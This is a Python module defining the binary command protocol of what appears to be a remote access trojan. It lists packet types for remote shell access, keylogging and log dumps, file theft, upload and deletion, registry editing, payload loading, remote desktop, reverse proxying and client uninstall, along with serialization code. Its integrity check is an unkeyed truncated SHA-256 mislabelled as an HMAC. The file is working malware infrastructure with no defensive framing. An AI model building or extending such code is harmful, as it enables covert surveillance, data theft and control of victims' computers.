import struct
import hashlib

PACKET_TYPES = {
    # Core
    'HEARTBEAT':     0x01,
    'SYSTEM_INFO':   0x02,
    'SHELL_COMMAND': 0x03,
    'SHELL_OUTPUT':  0x04,
    'FILE_REQUEST':  0x05,
    'FILE_DATA':     0x06,
    # Interactive shell
    'SHELL_OPEN':    0x20,
    'SHELL_INPUT':   0x21,
    'SHELL_STREAM':  0x22,
    'SHELL_CLOSE':   0x23,
    # File Manager 0x30-0x3F
    'FM_LIST_REQ':      0x30,
    'FM_LIST_RESP':     0x31,
    'FM_DOWNLOAD_REQ':  0x32,
    'FM_DOWNLOAD_DATA': 0x33,
    'FM_UPLOAD':        0x34,
    'FM_DELETE':        0x35,
    'FM_MKDIR':         0x36,
    'FM_RESULT':        0x37,
    # Keylogger 0x40-0x4F
    'KEYLOG_START':  0x40,
    'KEYLOG_STOP':   0x41,
    'KEYLOG_DATA':   0x42,
    'KEYLOG_DUMP':   0x43,  # request offline log dump
    # Process Manager 0x50-0x5F
    'PROC_LIST_REQ':  0x50,
    'PROC_LIST_RESP': 0x51,
    'PROC_KILL':      0x52,
    # Registry 0x60-0x6F
    'REG_LIST_REQ':  0x60,
    'REG_LIST_RESP': 0x61,
    'REG_READ_REQ':  0x62,
    'REG_READ_RESP': 0x63,
    'REG_WRITE':     0x64,
    'REG_DELETE':    0x65,
    # Loader 0x70-0x7F
    'LOADER_EXEC':   0x70,
    'LOADER_RESULT': 0x71,
    # Remote Desktop 0x80-0x8F
    'RD_START':  0x80,
    'RD_FRAME':  0x81,
    'RD_INPUT':  0x82,
    'RD_STOP':   0x83,
    # Reverse Proxy 0x90-0x9F
    'PROXY_START': 0x90,
    'PROXY_DATA':  0x91,
    'PROXY_STOP':  0x92,
    # Client control 0xA0-0xAF
    'CLIENT_CLOSE':     0xA0,
    'CLIENT_UNINSTALL': 0xA1,
    'CLIENT_UPDATE':    0xA2,
    # Task on connect 0xB0-0xBF
    'TASK_EXEC':   0xB0,
    'TASK_RESULT': 0xB1,
    # GET_CLIENTS (GUI control)
    'GET_CLIENTS':      0x10,
    'GET_CLIENTS_RESP': 0x11,
    # Error
    'ERROR': 0xFF,
}

class Packet:
    def __init__(self, packet_type: int, payload: bytes, session_id: int = 0):
        self.type       = packet_type
        self.payload    = payload
        self.session_id = session_id

    def serialize(self) -> bytes:
        payload_len = len(self.payload)
        header      = struct.pack('<IBI', payload_len, self.type, self.session_id)
        hmac        = hashlib.sha256(header + self.payload).digest()[:16]
        return header + self.payload + hmac

    @staticmethod
    def deserialize(data: bytes):
        if len(data) < 25:
            return None
        header = data[:9]
        payload_len, packet_type, session_id = struct.unpack('<IBI', header)
        if len(data) < 9 + payload_len + 16:
            return None
        payload      = data[9:9 + payload_len]
        rcv_hmac     = data[9 + payload_len:9 + payload_len + 16]
        computed_hmac = hashlib.sha256(header + payload).digest()[:16]
        if rcv_hmac != computed_hmac:
            return None
        return Packet(packet_type, payload, session_id)


def create_packet(packet_type, payload: bytes, session_id: int = 0) -> bytes:
    if isinstance(packet_type, str):
        packet_type = PACKET_TYPES[packet_type]
    return Packet(packet_type, payload, session_id).serialize()


def parse_packet(data: bytes):
    return Packet.deserialize(data)